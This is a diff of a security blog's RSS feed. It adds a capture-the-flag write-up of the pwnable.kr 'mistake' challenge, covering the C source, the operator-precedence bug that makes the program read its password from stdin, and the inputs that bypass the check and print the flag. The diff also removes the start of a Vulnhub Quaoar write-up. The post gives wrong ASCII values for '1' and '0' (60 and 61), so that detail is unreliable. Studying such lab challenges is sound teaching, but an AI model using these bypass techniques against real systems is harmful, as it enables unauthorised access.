@@ -7,6 +7,140 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Pwnable.kr - mistake</title>
+        <description>&lt;p&gt;Today we’re going to learn a lot about operator priority, and why some of mistakes made in this topic can be so devastating. Great example of that will be a challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;mistake&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;We all make mistakes, let's move on.
+(don't take this too seriously, no fancy hacking skill is required at all)
+
+This task is based on real event
+Thanks to dhmonkey
+
+hint : operator priority&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After connecting to &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt; server, we can see two files waiting for us, compiled binary and source code.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ssh mistake@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
+mistake@pwnable.krs password:
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
+|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|
+
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
+- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
+Last login: Thu Dec 28 05:48:19 2017 from 93.234.107.184
+mistake@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 44
+drwxr-x---  5 root        mistake 4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 87 root        root    4096 Dec 27 23:17 ..
+d---------  2 root        root    4096 Jul 29  2014 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 mistake_pwn root      51 Jul 29  2014 flag
+dr-xr-xr-x  2 root        root    4096 Aug 20  2014 .irssi
+&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 mistake_pwn mistake 8934 Aug  1  2014 mistake
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root        root     792 Aug  1  2014 mistake.c
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 mistake_pwn root      10 Jul 29  2014 password
+drwxr-xr-x  2 root        root    4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s take a look at the code firstly.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define PW_LEN 10
+#define XORKEY 1
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XORKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
+
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/home/mistake/password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;can't open password %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;do not bruteforce...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PW_LEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PW_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read error&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PW_LEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input password : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%10s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;// xor your input
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PW_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wrong Password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;endhigh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s study the code to find out where the mistakes are. We can clearly see the first bug in the &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As the hint suggested, there’s a mistake in operator priority. We know that comparision operator &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is given &lt;strong&gt;&lt;em&gt;higher priority&lt;/em&gt;&lt;/strong&gt; than assignment operator &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt;. Using parenthis this piece of code will look just like this.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And as we know, that open will return a non-negative integer representing the lowest numbered unused file descriptor, comparision will always &lt;strong&gt;&lt;em&gt;fail&lt;/em&gt;&lt;/strong&gt; and return &lt;strong&gt;&lt;em&gt;0&lt;/em&gt;&lt;/strong&gt;. Then 0 is assigned to the &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; variable. In addition, from the previous challenges, we know that file descriptor with value 0 is reserved for &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PW_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In this line, as &lt;code class=&quot;highlighter-rouge&quot;&gt;fd=0&lt;/code&gt;, program will copy the input from &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt; to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pw_buf&lt;/code&gt;. After that every character from the second input &lt;code class=&quot;highlighter-rouge&quot;&gt;pw_buf2&lt;/code&gt; will be xored with 1, and lastly password will be compared in this line.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;strncmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pw_buf, pw_buf2, PW_LEN&lt;span class=&quot;o&quot;&gt;)){&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So if we find out combination where first character xored with the 1 will result in the second, we will be able to bypass the password check. I picked &lt;strong&gt;&lt;em&gt;1&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;0&lt;/em&gt;&lt;/strong&gt;, as theire respective values in ASCII are &lt;strong&gt;&lt;em&gt;60&lt;/em&gt;&lt;/strong&gt;* and &lt;strong&gt;&lt;em&gt;61&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we’re ready to pass these numbers into the program.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mistake@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mistake
+&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not bruteforce...
+1111111111
+input password : 0000000000
+Password OK
+Mommy, the operator priority always confuses me :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+        <pubDate>Thu, 28 Dec 2017 08:00:00 +0000</pubDate>
+        <link>http://localhost:4000/pwnable.kr-mistake/</link>
+        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-mistake/</guid>
+      </item>
+    
+      <item>
         <title>Summary of 2017</title>
         <description>&lt;p&gt;Another year, another summary. I’m kind of sad that this year is coming to an end, as 2017 made me develop my skills more than every other year summed together. But I have plans, big plans for the future, which some of them, I’m going to briefly introduce in this post.&lt;/p&gt;
 
@@ -1630,386 +1764,6 @@ Good luck!
         <pubDate>Sun, 10 Sep 2017 08:00:00 +0000</pubDate>
         <link>http://localhost:4000/gynveal-mission-10-polish/</link>
         <guid isPermaLink="true">http://localhost:4000/gynveal-mission-10-polish/</guid>
-      </item>
-    
-      <item>
-        <title>Vulnhub.com - Quaoar</title>
-        <description>&lt;p&gt;Hello everyone, another week, another challenge from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;. This time we're going to work on a short machine called &lt;b&gt;Quaoar&lt;/b&gt;. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Quaoar
-
-This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/
-
-Difficulty : Very Easy
-
-Tips:
-
-Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)
-
-Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box
-
-Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing
-
-SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753
-
-You may have issues with VMware&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/viper,475/&quot;&gt;&lt;b&gt;Viper&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&quot;&gt;&lt;b&gt;Quaoar&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h1&gt;Write-Up&lt;/h1&gt;
-
-&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.103&lt;/b&gt;&lt;/p&gt;
-&lt;p&gt;Victim: &lt;b&gt;Quaoar 192.168.56.102&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;Let's start by firstly scanning the machine with &lt;b&gt;nmap&lt;/b&gt;. &lt;/p&gt;
-
